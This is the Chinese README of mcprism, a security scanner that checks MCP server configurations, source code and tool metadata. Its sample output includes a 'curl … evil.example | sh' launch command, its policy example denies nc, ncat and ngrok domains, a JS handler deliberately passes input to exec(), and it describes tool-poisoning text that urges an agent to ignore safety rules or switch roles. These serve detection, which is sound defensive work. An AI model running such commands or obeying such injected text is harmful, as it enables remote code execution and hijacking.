<div align="center">

<p><a href="README.md">English</a> · 简体中文 · <a href="docs/i18n/README.ja-JP.md">日本語</a> · <a href="docs/i18n/README.ko-KR.md">한국어</a> · <a href="docs/i18n/README.fr-FR.md">Français</a> · <a href="docs/i18n/README.de-DE.md">Deutsch</a> · <a href="docs/i18n/README.es-ES.md">Español</a> · <a href="docs/i18n/README.ru-RU.md">Русский</a> · <a href="docs/i18n/README.ar-SA.md">العربية</a></p>

<img src="assets/logo.svg" width="128" height="128" alt="mcprism logo">

# mcprism

**把 MCP 服务器接入 AI 前，先检查它的安全风险。**

MCP server 把 AI 助手连接到 GitHub、文件、数据库等外部工具和数据。它可能运行命令或读取文件，因此 mcprism 会检查它的配置和本地源码，并报告潜在风险。

运行 `mcprism scan` 检查 AI 客户端里已配置的 server；如果没有发现配置，用 `mcprism doctor` 查看发现结果；用 `mcprism vet ...` 单独审查准备接入的 server。动态探测需要主动开启，只会列出工具，不会调用工具。如果你暂时不用 MCP，可能还不需要 mcprism。

mcprism 是 [Model Context Protocol](https://modelcontextprotocol.io/) server 的安全扫描器。它从三个角度审查一个 server：

1. **配置**：客户端如何启动或连接它——版本是否固定、是否明文传输、配置里有没有凭据、是否指向云元数据或内网。
2. **源码**：当实现代码就在本地时，读取 JS/TS/Python/Go/Rust 的工具 handler，追踪 agent 可控的参数是否流入危险 sink：执行命令、发起请求（SSRF）、拼接文件路径，以及 eval、不安全反序列化和硬编码密钥。
3. **运行时**：自动协商新版无状态 MCP 协议或旧版握手，列出 tools、resources、prompts，并检查工具元数据是否被投毒。它不会调用任何工具。

每个 server 都会得到一份发现清单、一个 0–100 的分数和一个 A–F 的评级。整个工具是一个 Go 二进制，没有运行时依赖。本地配置和源码扫描完全离线；`registry` 命令会主动连接官方 Registry 获取公开元数据，但不会启动或连接条目中的 server。动态探测必须显式开启（`--dynamic` / `--probe`）。

[![CI](https://github.com/HUA503/mcprism/actions/workflows/ci.yml/badge.svg)](https://github.com/HUA503/mcprism/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/HUA503/mcprism?color=a6e3a1&label=release)](https://github.com/HUA503/mcprism/releases)
[![Go Report Card](https://goreportcard.com/badge/github.com/HUA503/mcprism)](https://goreportcard.com/report/github.com/HUA503/mcprism)
[![Go version](https://img.shields.io/badge/go-1.25-89b4fa?logo=go&logoColor=white)](https://go.dev)
[![License](https://img.shields.io/github/license/HUA503/mcprism?color=cba6f7)](LICENSE)

</div>

---

<p align="center">
  <img src="assets/demo.gif?v=0.14.0" alt="mcprism 检查安全和存在风险的 MCP 服务器配置" width="78%">
</p>

<p align="center">
  <img src="assets/tui.png" alt="mcprism 交互式终端界面" width="86%">
</p>

MCP 让 AI agent 连接外部 server 来获取工具、文件和数据。Claude Desktop 和 Claude Code、Cursor、VS Code、Windsurf 等客户端都内置了这个协议，所以一套环境装下来，往往会接上好几个 server。这些 server 会执行命令、读取文件系统、看到你的提示词。一个恶意或权限过大的 server 可以窃取凭据、执行命令，或者通过返回的文本诱导 agent。mcprism 在你让 agent 使用这些 server 之前，给出逐个 server 的报告和评分，就像用 `trivy` 扫镜像一样。

<p align="center">
  <img src="assets/comparison.png" alt="使用 mcprism 前后对比" width="100%">
</p>

## 两行快速体验

```sh
curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh
mcprism demo
```

```powershell
# Windows PowerShell
irm https://raw.githubusercontent.com/HUA503/mcprism/main/install.ps1 | iex
mcprism demo
```

### 用示例离线体验

内置示例随二进制一起发布，不需要克隆仓库或配置 MCP 客户端。它会扫描一个
安全示例和多个故意设置了风险的示例。扫描完全离线，不读取你的配置，也不会
启动任何 server。示例中的风险发现是预期结果，demo 命令仍会正常退出。

```sh
mcprism demo
mcprism demo --format html --output mcprism-demo.html
```

在 Windows PowerShell 中用 `Invoke-Item .\mcprism-demo.html` 打开报告。
要扫描你实际配置的 MCP 客户端，运行 `mcprism scan`。

要从当前目录向上查找项目级配置并跳过个人配置，运行 `mcprism scan --project-only`。

## 一行审查单个 server

不用写进任何配置，直接检查启动命令、URL、包名或本地代码：

```sh
mcprism vet -- npx -y some-mcp-server
mcprism vet https://mcp.example.com
mcprism vet npm:@scope/name
mcprism vet ./path/to/server     # 审查整个源码目录
mcprism vet server.py            # 审查单个文件
```

`vet` 默认只做静态分析，不会运行目标。加 `--probe` 才会启动它并枚举 tools、resources 和 prompts。源码目录或文件会走下面的源码分析引擎，不需要联网。

<p align="center">
  <img src="assets/vet.png?v=0.9.2" alt="mcprism vet 拦截 curl|sh 启动命令" width="94%">
</p>

## 目录

- [更新日志](CHANGELOG.md)
- [攻击面分析](docs/MCP-ATTACK-SURFACE.md)
- [发布工具包](docs/LAUNCH-KIT.md)
- [功能](#功能)
- [适用场景](#适用场景)
- [报告](#报告)
- [安装](#安装)
- [快速开始](#快速开始)
- [示例输出](#示例输出)
- [策略即代码](#策略即代码)
- [源码分析（SAST）](#源码分析sast)
- [检测内容](#检测内容)
- [输出格式](#输出格式)
- [支持的客户端与传输](#支持的客户端与传输)
- [CI/CD](#cicd)
- [工作原理](#工作原理)
- [对比](#对比)
- [常见问题](#常见问题)
- [路线图](#路线图)
- [贡献](#贡献)

## 功能

- 单个二进制。不用装 Python 或 Node，不需要 LLM API key，也不用注册账号。
- 默认静态。它读取配置，在有本地代码时审查 JS/TS/Python/Go/Rust 源码；加 `--dynamic` 才会自动协商新旧 MCP 协议并列出 tools/resources/prompts，但不会调用任何工具。
- 看 schema。对于没有源码的在线 server，如果名为 command、url、path 之类的字符串参数接受任意值，会按命令执行、SSRF、路径风险报出；用 enum、const、pattern 约束过的参数不报。
- 策略即代码。开关规则、调整严重级、允许或拒绝包·命令·域名、要求网络隔离。内置 `default`、`strict`、`ci` 三套配置。
- 风险接受清单。可以带理由和到期时间抑制发现，也可以用 `--baseline` 接受整份旧报告，只让新问题卡住构建；被抑制项仍显示在报告里，过期后自动重新出现。
- 工具清单锁。保存工具名称和 SHA-256 指纹；之后若 server 新增、删除或修改工具定义，命令会报出差异并返回失败。锁文件不保存工具描述或 schema。保存和验证时会连接 server 来枚举工具，但不会调用工具。
- 结果确定。35 条内置规则在适用时映射到 OWASP MCP01–MCP07。本地配置和源码静态分析不联网；`registry` 命令只从官方 Registry 获取公开元数据。动态探测是可选的，会启动 server 进程，请在沙箱里运行。探测带有出站防护（不允许重定向到云元数据或 link-local 地址），并且默认只给被拉起的进程一个受限的环境变量集合，而不是整个 shell。
- 面向人和机器的报告：table、JSON、Markdown、HTML、SARIF、JUnit XML、CycloneDX SBOM、CSV。
- 一次扫描多个目标：文件、目录（递归）、URL。

## 适用场景

- 你装了一些 MCP server，想在 agent 运行前知道它们能访问什么。跑 `mcprism scan`。
- 一个团队共用一组 server，想要一份有记录的统一基线。把 `policy.yml` 放进版本库，在生产机器上跑 `--profile strict`。
- 你在 CI 里审查变更。跑 `mcprism scan --profile ci`，出现 high 及以上问题就让构建失败，或者把 SARIF 发布到 code scanning。
- 你准备把 Registry 中的 server 加入客户端前，可以用 `mcprism registry scan <名称>` 检查单个条目，也可以用 `mcprism registry audit <关键词>` 批量审查匹配条目。批量审计会对支持的元数据应用策略，不会启动 server。

## 报告

<p align="center">
  <img src="assets/screenshot-dynamic.png?v=0.14.0" alt="mcprism 对在线 server 的 HTML 报告" width="86%">
</p>

跨多个 server 的批量审查（静态模式）：

<p align="center">
  <img src="assets/screenshot-static.png?v=0.14.0" alt="mcprism 跨多个 server 的 HTML 报告" width="70%">
</p>

## 安装

```sh
# 一键安装脚本（Linux / macOS）
curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh
```

```powershell
# Windows PowerShell
irm https://raw.githubusercontent.com/HUA503/mcprism/main/install.ps1 | iex
```

```sh
# 用 Go 安装
go install github.com/HUA503/mcprism/cmd/mcprism@latest
```

Homebrew 会从源码构建 mcprism，并在每次正式发布时自动更新公式：

```sh
brew tap HUA503/mcprism https://github.com/HUA503/mcprism
brew install HUA503/mcprism/mcprism
```

PowerShell 安装脚本会校验发布包的 SHA-256，并将用户级安装目录加入 PATH。
Windows 用户也可以通过 [Scoop](https://scoop.sh) 安装：

在 Linux 和 macOS 上，如果 `/usr/local/bin` 不可写，安装脚本会改装到
`~/.local/bin`。如果提示该目录不在 PATH 中，请将它加入 PATH，或直接运行
`~/.local/bin/mcprism scan`。

```powershell
scoop bucket add mcprism https://github.com/HUA503/mcprism
scoop install mcprism/mcprism
```

使用 Nix flakes 可在 Linux 或 macOS（x86_64、aarch64）上安装 `main` 分支的最新版本：

```sh
nix profile install github:HUA503/mcprism
nix run github:HUA503/mcprism -- scan
```

GoReleaser 会在每次正式发布时更新 Scoop 清单和 Homebrew 公式。Homebrew 从带校验值的源码包构建。也可以从 [releases](https://github.com/HUA503/mcprism/releases) 下载二进制（Linux/macOS/Windows 支持 amd64 和 arm64，Linux 另支持 ARMv7）。Nix flake 锁定了 nixpkgs 和 Go 依赖哈希，并从源码构建。

从 v0.8.4 开始，发布包会附带可验证的构建来源证明。可在[安全政策](SECURITY.md)中查看验证方法。

## 快速开始

```sh
# 自动发现 Claude、Codex、Kiro、Amazon Q、GitHub Copilot CLI、Zed、Gemini CLI、OpenCode、Roo Code 等客户端的配置
mcprism scan

# 查看自动发现能找到哪些 MCP 配置
mcprism doctor

# 扫描指定配置文件
mcprism scan ~/.claude.json
mcprism scan ~/.codex/config.toml

# 递归扫描一个目录
mcprism scan ./configs

# 扫描远程 server
mcprism scan https://mcp.example.com/v1

# 一次扫描多个目标
mcprism scan a.json b.json ./configs

# 默认静态：不启动进程、不发起连接
mcprism scan mcp.json

# 动态探测在线 server（会启动进程；请在沙箱里运行）
mcprism scan mcp.json --dynamic

# 套用配置或自定义策略
mcprism scan --profile strict
mcprism scan --policy policy.yml --suppressions suppressions.yml

# 接受已有问题，只对新问题报错（渐进式接入）
mcprism scan mcp.json -f json -o baseline.json
mcprism scan mcp.json --baseline baseline.json

# 交互式终端界面
mcprism scan -i

# 不写配置，直接审查启动命令 / URL / 包名
mcprism vet -- npx -y some-mcp-server
mcprism vet "uvx some-mcp-server"
mcprism vet https://mcp.example.com
mcprism vet npm:@scope/name
mcprism vet --probe -- npx -y some-mcp-server   # 真正运行并列出 tools

# 搜索并静态扫描官方 MCP Registry 中的单个 server
mcprism registry search filesystem
mcprism registry scan io.github.user/server-name

# 批量审计最多 20 个匹配条目，并生成一份合并报告
mcprism registry audit filesystem --all --limit 100 --require-complete --format sarif --output registry.sarif

# 参考信息
mcprism inspect mcp.json     # 列出 server 的 tools/resources/prompts
mcprism rules                # 列出内置规则
mcprism profiles             # 列出内置基线

# 锁定一个已审查服务器的工具定义，并检测后续变化
mcprism inventory save one-server.json --output server.tools.lock.json
mcprism inventory verify one-server.json --baseline server.tools.lock.json
```

Registry 批量审计默认只检查一页（最多 100 条）。加上 `--all` 会继续按游标分页并审计所有匹配项；`--require-complete` 会在仍有配置无法审计时返回非零状态。解读报告前请检查标准错误输出中的警告，因为这些警告可能不会写入报告。

`inventory save` 和 `inventory verify` 会连接远程服务或启动 stdio 进程来枚举工具，但不会调用工具。先审查目标；不可信服务请在沙箱中运行。锁文件只保存工具名和哈希，不保存描述、schema 或配置值。首次审查通过后保存，升级后运行 verify；发现工具新增、删除或定义变化时退出码为 1。只有审阅变更后才用 `--force` 覆盖锁。

### Shell 自动补全

`mcprism completion` 可生成 Bash、Zsh、Fish 和 PowerShell 的补全脚本。在当前终端执行对应命令：

- Bash 或 Zsh：`source <(mcprism completion bash)` / `source <(mcprism completion zsh)`
- Fish：`mcprism completion fish | source`
- PowerShell：`mcprism completion powershell | Out-String | Invoke-Expression`

将对应命令加入 shell 配置文件，即可在新终端中自动启用。

### 参数

| 参数 | 说明 |
|---|---|
| `-f, --format` | `table`（默认）· `json` · `sarif` · `md` · `html` · `junit` · `cyclonedx` · `csv` |
| `-o, --output` | 把报告写入文件 |
| `-p, --policy` | 策略 YAML 文件路径 |
| `--profile` | 内置基线：`default` · `strict` · `ci` |
| `--suppressions` | 抑制清单 YAML 文件路径 |
| `--fail-on` | 有未被抑制的发现达到指定严重级别时判定审查失败，可选 `critical` / `high` / `medium` / `low` |
| `--timeout` | 单个 server 的握手超时（默认 `10s`） |
| `--project-only`（`scan`） | 只自动发现项目级配置，跳过用户级配置。用 `--project DIR` 指定起始目录。 |
| `-i, --interactive` | 在 TUI 中浏览发现 |
| `--transport` | 对 URL 强制使用 `http`（Streamable HTTP）或 `sse`（旧版） |
| `--dynamic`（`scan`） | 动态探测在线 server：启动/连接并列出 tools/resources/prompts。会启动目标进程，可能执行代码或联网，请在沙箱里运行 |
| `--probe`（`vet`） | 真正启动/连接并枚举工具；会运行目标，建议在沙箱内进行 |
| `--inherit-env` | 动态探测拉起 server 时透传当前完整环境变量。默认只给一小份安全白名单，避免把 shell 里的凭据交给不可信 server |
| `--no-color` | 关闭终端报告里的 ANSI 颜色 |
| `--ascii` | 终端只用 ASCII 字符（旧版 Windows 控制台和 `TERM=dumb` 会自动启用，同时尊重 `NO_COLOR`） |

在 CI 或脚本中运行 `scan` 和 `vet` 时，可以通过退出码区分审查结果与执行错误。

| 退出码 | 含义 |
|---|---|
| `0` | 审查完成并通过检查。 |
| `1` | 策略检查或 `--fail-on` 检查未通过，报告照常输出。 |
| `2` | 命令执行失败，例如参数无效、显式扫描的目录中存在无法解析的配置文件，或报告写入失败。 |

## 示例输出

以静态模式扫描两个本地 server：

```text
◆ mcprism   v0.21.0 · 2026-11-26
────────────────────────────────────────────────
 A  notes  ◌ static only
  npx -y @acme/notes-mcp@2.0.1
  capabilities: none
  ✓ No issues detected

 F  shell  ◌ static only
  bash -c curl -s https://evil.example/x | sh
  capabilities: SHELL · NET
  CRIT MCP104  Remote code fetched and executed by shell
  CRIT MCP301  Command execution combined with network access
────────────────────────────────────────────────
2 servers · 2 findings
2 CRIT  0 HIGH  0 MED  0 LOW
```

HTML 和 SARIF 格式还会给出证据、修复建议和 OWASP 映射。

## 策略即代码

策略文件是一份带版本号的 YAML。它设置通过/失败条件，覆盖单条规则，列出允许和拒绝的包·命令·域名，还可以要求有文件或 shell 能力的 server 不能联网。

```yaml
version: "1"
fail:
  on: high
  grade: B
  score: 70
rules:
  MCP106:
    severity: high
allow:
  packages: ["@modelcontextprotocol/*"]
deny:
  commands: [nc, ncat]
  domains: ["*.ngrok.io"]
capabilities:
  requireNetworkIsolation: true
```

命中 deny 会报 `MCP700`；在隔离要求下，有文件/shell 能力且能联网的 server 会报 `MCP701`。参考 [`examples/policy.yml`](examples/policy.yml)、[`examples/suppressions.yml`](examples/suppressions.yml) 和[策略指南](docs/POLICIES.md)。合规门和机器可读输出见 [docs/COMPLIANCE.md](docs/COMPLIANCE.md)。

## 源码分析（SAST）

配置能说明一个 server 怎么启动，却说明不了 handler 会拿参数做什么。一个在配置里看起来没问题的 server，仍可能把工具参数直接交给 shell、当作请求 URL，或者用它拼出文件路径。这些漏洞在实现代码里，所以 mcprism 会读代码。

把 `vet` 指向一个代码目录或单个文件即可。不需要构建、不需要安装依赖、不需要联网：

```sh
mcprism vet ./mcp-server
mcprism vet ./mcp-server/src/tool.ts
```

它能识别常见的 SDK 和框架：

- JavaScript/TypeScript：`@modelcontextprotocol/sdk` 的 `McpServer`、底层的 `Server.setRequestHandler`，以及各类 `.tool(...)` 注册。
- Python：`FastMCP` 的 `@mcp.tool()` 装饰器和底层的 `call_tool` handler。
- Go：mcp-go 的 `server.AddTool` / `mcp.AddTool` 回调。
- Rust：官方 `rmcp` SDK 的 `#[tool]` 方法。

对每个工具，它把 handler 参数当作攻击者可控的数据。JS/TS、Python、Go 和 Rust 会追踪简单局部别名及传入明确 helper 的参数；Go 还能跨同一 package 的多个源码文件追踪唯一的普通函数，Rust 支持多层同文件 helper 调用。发现会标明文件和行号、展示代码、给出修复方式：

| 规则 | sink | 默认级别 |
|---|---|---|
| MCP801 | 工具参数流入命令/进程 sink（`exec`、`spawn`、`os.system`、`subprocess shell=True`） | critical |
| MCP802 | 工具参数控制请求 URL（`fetch`、`requests`、`httpx`）——SSRF | high |
| MCP803 | 工具参数被当作文件路径，且没有限定范围 | high |
| MCP804 | 动态执行代码（`eval`、`Function`、`exec`） | high |
| MCP805 | 不安全反序列化（`pickle`、`marshal`、`yaml.load`） | high |
| MCP806 | 源码中硬编码凭据 | high |
| MCP807 | 动态 `require`/import 的模块名来自工具输入 | medium |

为了压低误报，它能识别常见的安全写法，出现时就不报：

- 固定命令、参数以数组形式传入（`execFile(cmd, args)`、`subprocess.run([...])`），而不是 shell 字符串。
- 路径限定：`path.resolve(base, name)` 后用 `startsWith(base)` 校验，Python 里用 `realpath` + `startswith`。
- 固定的 URL 前缀而不是让 agent 选 host，以及 `yaml.safe_load` / `SafeLoader`。
- Go 里用参数全为常量、不经过 shell 的 `exec.Command`，固定 URL，以及用 `strings.HasPrefix` 校验的 `filepath.Join`。

元数据投毒规则还覆盖常见简体和繁体中文诱导语句，例如要求忽略安全策略、切换角色/模式、把普通内容重新解释为高优先级指令，以及要求输出隐藏推理内容。它仍是确定性的特征匹配，不会理解所有语义变体。

下面这个 handler 会因为 agent 能控制命令而被标记 MCP801：

```js
server.tool("run", { command: z.string() }, async ({ command }) => {
  exec(command, (err, stdout) => callback(stdout));
});
```

修复版用白名单，且不经过 shell：

```js
const ALLOWED = { status: ["git", "status"], log: ["git", "log", "-5"] };
server.tool("git", { name: z.string() }, async ({ name }) => {
  const spec = ALLOWED[name];
  if (!spec) throw new Error("not allowed");
  const [cmd, ...args] = spec;
  return execFile(cmd, args);
});
```

引擎使用模式匹配，不依赖第三方解析器，因此二进制保持小巧、自包含。JS/TS、Python、Go 和 Rust 会追踪简单局部别名及传入明确 helper 的参数；Go 可跨同一 package 追踪唯一普通函数，Rust 可追踪多层、唯一命名的同文件 helper。Rust 不展开宏或解析 trait 分派。请注意下面这些边界，不要把“没报问题”理解成“证明安全”：

- 除 Go 同 package 的普通函数外，目前不会跨文件追踪；也不追踪对象属性、返回值、动态分派或解构/导入别名（例如 `import { exec as run }`、`child_process["ex"+"ec"]`）。sink 仍通过模式匹配识别，特殊排版或生成代码可能漏检或误判。
- Go 使用标准库 `go/parser` 定位 helper 函数边界，但尚未构建全程序数据流图；JS/Python 没有使用 tree-sitter。
- Rust 识别 `rmcp` 的 `#[tool]` 宏，以及常见进程、`reqwest`、文件系统和密钥模式。
- 只分析 JavaScript/TypeScript、Python、Go、Rust；其他语言写的 server 只做配置和元数据层面的检查。

对高风险 server，请配合完整数据流分析工具和人工复核一起使用。规则细节和更多示例见 [docs/SAST.md](docs/SAST.md)。

<p align="center">
  <img src="assets/sast.png?v=0.9.2" alt="mcprism 源码分析发现" width="94%">
</p>

## 检测内容

- 配置中的凭据。可识别的凭据格式（AWS、Google、GitHub、Slack、Stripe、GitLab、OpenAI、JWT 等）会按类型标出；看起来像生成密钥的高熵值会作为疑似密钥标出。占位符和 `${ENV_VAR}` 引用不会被标记。
- 明文传输和关闭 TLS（`http://`、`NODE_TLS_REJECT_UNAUTHORIZED=0`）。
- 权限过宽。文件系统 server 挂载到 `/` 或用户主目录；sandbox 或权限检查被关闭。
- 工具投毒。工具名称、描述和 schema 中常见的中英文注入指令、零宽/双向 Unicode、Unicode Tags、西里尔/希腊同形字（匹配前先做 NFKC 规范化）、隐藏 HTML/Markdown、编码块。中文检测基于明确短语特征，不做语义理解；隐晦改写仍可能漏报。正常的指导性说明不会被报；只有指令性措辞与隐藏或同形字符同时出现时才报 MCP205。resource 和 prompt 模板的元数据也会做同样检查。
- 自由格式 schema 参数。对于没有源码的在线 server，会按参数名把接受任意字符串的命令、URL（SSRF）、路径参数标为风险。
- 危险能力组合，比如 shell 加联网、读文件加联网、写文件加 shell。
- 网络目标。云元数据端点（`169.254.169.254`）和私有/回环地址段。
- 供应链风险：未固定版本的包、近似的仿冒包名、直接从远程 URL 运行代码。
- 源码风险：JS/TS/Python/Go handler 会检查命令、网络、文件、动态代码和反序列化风险；Rust `rmcp #[tool]` handler 会检查进程、`reqwest` URL、文件系统和硬编码密钥风险。见[源码分析（SAST）](#源码分析sast)。
- 策略违规：被拒绝的包·命令·域名，以及违反网络隔离。
- 跨 server 工具名冲突，以及分类后的连接失败（DNS / TLS / 拒绝连接 / 超时 / 命令不存在）。

完整规则和 OWASP 对照见 [docs/RULES.md](docs/RULES.md)。

## 输出格式

| 格式 | 典型用途 |
|---|---|
| `table` | 终端输出 |
| `json` | 自定义工具处理 |
| `sarif` | GitHub code scanning |
| `md` | Markdown 报告 / 工单 |
| `html` | 可分享的独立报告 |
| `junit` | Jenkins、GitLab、GitHub 测试报告 |
| `cyclonedx` | SBOM / 漏洞数据导入 |
| `csv` | 电子表格和 GRC 流程 |

## 支持的客户端与传输

mcprism 能读取 Claude Desktop、Claude Code、Kiro、Amazon Q Developer、GitHub Copilot CLI、Zed、Cursor、VS Code（GitHub Copilot Chat）、Windsurf、Cline、Roo Code、Continue 等工具使用的 JSON/JSONC MCP 配置，也支持 Gemini CLI 的 `~/.gemini/settings.json`、项目级 `.gemini/settings.json` 和 Codex 的 TOML 配置。Kiro IDE 和 CLI 共用全局 `~/.kiro/settings/mcp.json`，项目配置为 `.kiro/settings/mcp.json`；可用 `KIRO_HOME` 修改全局目录。Amazon Q Developer 检查全局 `~/.aws/amazonq/agents/default.json`、项目 `.amazonq/default.json` 和旧版 `mcp.json` 路径。Zed 使用 `context_servers`，支持用户级 `~/.config/zed/settings.json`（macOS 也检查 `~/.zed/settings.json`）、项目级 `.zed/settings.json` 以及 Agent Profile 内的 server。Copilot CLI 的用户级 server 位于 `~/.copilot/mcp-config.json`（也可通过 `$COPILOT_HOME` 自定义），项目级配置位于 `.mcp.json` 和 `.github/mcp.json`，支持 `mcpServers` 对象和项目配置的顶层 server map。OpenCode 使用 `opencode.json(c)` 中的 `mcp.servers`，本地命令数组、环境变量和远程 URL 也会转换成统一格式进行检查。它支持 `mcpServers` / `servers` 对象和数组，以及 Codex 的 `[mcp_servers.<name>]` 表。传输层支持 stdio、Streamable HTTP 和旧版 HTTP+SSE。

Codex 自动发现会检查系统配置（Unix 上为 `/etc/codex/config.toml`，Windows 上为 `%ProgramData%/OpenAI/Codex/config.toml`）、用户配置（`$CODEX_HOME/config.toml`，未设置时为 `~/.codex/config.toml`），以及项目配置（`.codex/config.toml` 和 `config.toml`）。`bearer_token_env_var` 引用的环境变量仅在显式使用 `--dynamic` 动态探测时读取。

Gemini CLI 还会自动发现系统默认配置和系统设置：Linux 路径为 `/etc/gemini-cli/system-defaults.json` 与 `/etc/gemini-cli/settings.json`，macOS 路径为 `/Library/Application Support/GeminiCli/system-defaults.json` 与 `/Library/Application Support/GeminiCli/settings.json`，Windows 路径为 `%ProgramData%/gemini-cli/system-defaults.json` 与 `%ProgramData%/gemini-cli/settings.json`。可用 `GEMINI_CLI_SYSTEM_DEFAULTS_PATH` 和 `GEMINI_CLI_SYSTEM_SETTINGS_PATH` 分别覆盖系统路径。

OpenCode 自动发现用户配置 `~/.config/opencode/opencode.json(c)`、项目配置 `opencode.json(c)` 与 `.opencode/opencode.json(c)`，以及 Linux `/etc/opencode/`、macOS `/Library/Application Support/opencode/`、Windows `%ProgramData%/opencode/` 下的系统配置。

Cline CLI 会自动检查 `~/.cline/data/settings/cline_mcp_settings.json`。
如果 Cline 使用自定义路径，可设置 `CLINE_MCP_SETTINGS_PATH`；旧版 VS Code
扩展的配置存储路径也会继续检查。

Roo Code 会自动发现项目中的 `.roo/mcp.json`；目录扫描也会将它识别为
Roo Code 配置。全局扩展配置也会从 VS Code 兼容编辑器的存储位置读取。

## CI/CD

把 mcprism 配成 [pre-commit](https://pre-commit.com) 钩子，提交前自动检查改动的 MCP 配置：

```yaml
- repo: https://github.com/HUA503/mcprism
  rev: v0.21.0
  hooks:
    - id: mcprism
```

钩子默认匹配文件名像 MCP 配置的 JSON（mcp.json、.mcp.json、claude_desktop_config.json、claude.json）；其他命名可在配置里覆盖 `files`。

用 `ci` 基线在流水线里拦截有风险的 server：

```yaml
- name: 审计 MCP server
  run: |
    curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh
    mcprism scan mcp.json --profile ci
```

通过 SARIF 把结果发布到 GitHub code scanning：

```yaml
name: MCP 安全检查
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
  security-events: write
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: mcprism
        uses: HUA503/mcprism@v0.21.0
        with:
          target: mcp.json
          sarif-file: mcprism.sarif
          # 可选：会动态连接单个 server；请使用不含密钥的隔离 runner。
          # inventory-target: mcp.json
          # inventory-baseline: mcp.tools.lock.json
      - uses: github/codeql-action/upload-sarif@1bd86f2fdb4b86187fa4059f16f31a3202acc9ea # v4
        if: always() && hashFiles('mcprism.sarif') != '' && (github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository)
        with:
          sarif_file: mcprism.sarif
```

该 Action 会下载匹配的 Linux、macOS 或 Windows release、验证 SHA-256 校验和，
并默认使用
`ci` profile。可通过 `policy`、`suppressions`、`baseline` 或 `fail-on` 设置自定义门禁。
`sarif-file` 输出可传给上传步骤。上传结果需要 workflow 有
`security-events: write` 权限。该 Action 支持 Linux、macOS 和 Windows runner；
Jenkins、GitLab 等其他 CI 请使用上面的 CLI 示例。
Action 固定到 release tag 时会自动使用同版本二进制。需要更强的供应链保护时，可将 Action 固定到完整 commit SHA。

要在 CI 中发现单个 server 的工具定义变化，先运行
`mcprism inventory save mcp.json --output mcp.tools.lock.json` 生成并审查锁文件，
再同时设置 `inventory-target` 和 `inventory-baseline`。这是显式启用的动态检查，
会连接 server 列出工具，也可能启动 stdio 进程；请使用不含密钥的专用 runner。

JUnit 输出可以直接用 Jenkins 和 GitLab 的测试报告步骤，CycloneDX 输出可以交给 SBOM 或漏洞跟踪系统。

## 工作原理

```mermaid
flowchart TD
  A[目标：自动发现 / 文件 / 目录 / URL / 源码树] --> B[分析]
  B --> B1[配置规则<br/>静态 · 能力 · 供应链 · 网络]
  B --> B2[源码 SAST<br/>工具参数到命令 · SSRF · 路径 sink]
  B --> B3[MCP 握手<br/>列出 tools、resources、prompts；投毒检查]
  B1 --> D[策略执行<br/>覆盖 · allow/deny · 网络隔离]
  B2 --> D
  B3 --> D
  D --> E[抑制<br/>接受的风险，带理由和到期时间]
  E --> F[评分 0–100、评级 A–F、合规门]
  F --> G[报告<br/>table · json · sarif · md · html · junit · cyclonedx · csv]
```

静态分析（默认）只读本地配置和源码文件，没有副作用，也不需要联网。动态探测需要显式开启：传入 `--dynamic` 或 `--probe` 时才会启动或连接目标 server。该模式下，被拉起的进程默认只拿到一份受限的环境变量白名单（而不是整个 shell，可用 `--inherit-env` 覆盖），并且出站防护会拒绝重定向、拒绝拨向云元数据和 link-local 地址（169.254.0.0/16、100.100.100.200、fe80::/10）。即便有这些保护，仍应把不可信 server 当作不可信，在沙箱或虚拟机里探测。命令行、URL、证据里出现的密钥在所有报告格式中都会被掩码。自带的演示 server（`examples/testserver`）只模拟风险行为，不会真的执行。代码结构和数据流见 [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)。

## 对比

依据各项目公开描述（功能可能变化）：

| | **mcprism** | mcp-scan | mcp-audit | 人工审查 |
|---|---|---|---|---|
| 语言 / 运行时 | Go，单二进制 | Python | Python/Node | — |
| 零安装 / 无运行时依赖 | ✅ | ❌ | ❌ | — |
| 静态配置检查 | ✅ | ✅ | 部分 | ❌ |
| 实时能力枚举 | ✅ | 部分 | 部分 | ❌ |
| 源码 SAST（handler 到 sink 的 taint） | ✅ | ❌ | ❌ | ❌ |
| 工具投毒检测 | ✅ | ✅ | 部分 | ❌ |
| 能力组合建模 | ✅ | ❌ | ❌ | ❌ |
| 策略即代码（allow/deny/隔离） | ✅ | ❌ | ❌ | ❌ |
| JUnit / CycloneDX / CSV 输出 | ✅ | ❌ | ❌ | ❌ |
| 递归、多目标扫描 | ✅ | 部分 | ❌ | ❌ |
| SARIF + CI 退出码 | ✅ | ✅ | ❌ | ❌ |
| 本地扫描离线、不用 LLM | ✅ | ✅ | 部分 | ✅ |
| 跨平台 | ✅ | 部分 | 部分 | — |

## 常见问题

**mcprism 会调用我的工具吗？**
不会。它只做 MCP 的 initialize 和列出请求，不会调用工具、不会通过 server 打开文件、也不会发送提示词。

**`inventory save` 和 `inventory verify` 会启动 server 吗？**
会连接远程 server 或启动 stdio 进程来枚举工具，但不会调用工具。检查不可信目标时请使用沙箱或不含密钥的专用 runner；锁文件只保存工具名和哈希。

**它会把数据发到别处吗？**
没有遥测，也不会上传本地配置或报告。`registry search` 和 `registry audit` 会把搜索词发送给官方 MCP Registry，`registry scan` 会发送指定名称以获取公开元数据；其他静态扫描不会联网。动态扫描（`scan --dynamic` / `vet --probe`）会启动或连接你指定的 server，该进程可能执行代码或联网，请在沙箱里运行。探测会拒绝跨 host 重定向、拒绝连接云元数据/link-local 地址，默认也不会把你的 shell 环境传给被拉起的 server。

**我的 token 会出现在报告里吗？**
不会。URL 里的账号密码、`--api-key`/`--token` 一类参数、`key=value`、`Bearer` 头，以及已知 token 前缀（AWS、GitHub、Slack、GitLab、OpenAI、JWT）都会在目标字符串和证据里被掩码成 `***`，所有输出格式一致。检测仍基于原始值进行，因此脱敏不会造成漏报。

**它和 mcp-scan、mcp-audit 有什么区别？**
后两者基于 Python 或 Node，主要关注配置或投毒。mcprism 是 Go 单二进制，会对能力组合建模、执行策略即代码，除 SARIF 外还输出 JUnit、CycloneDX 和 CSV。详见[对比表](#对比)。

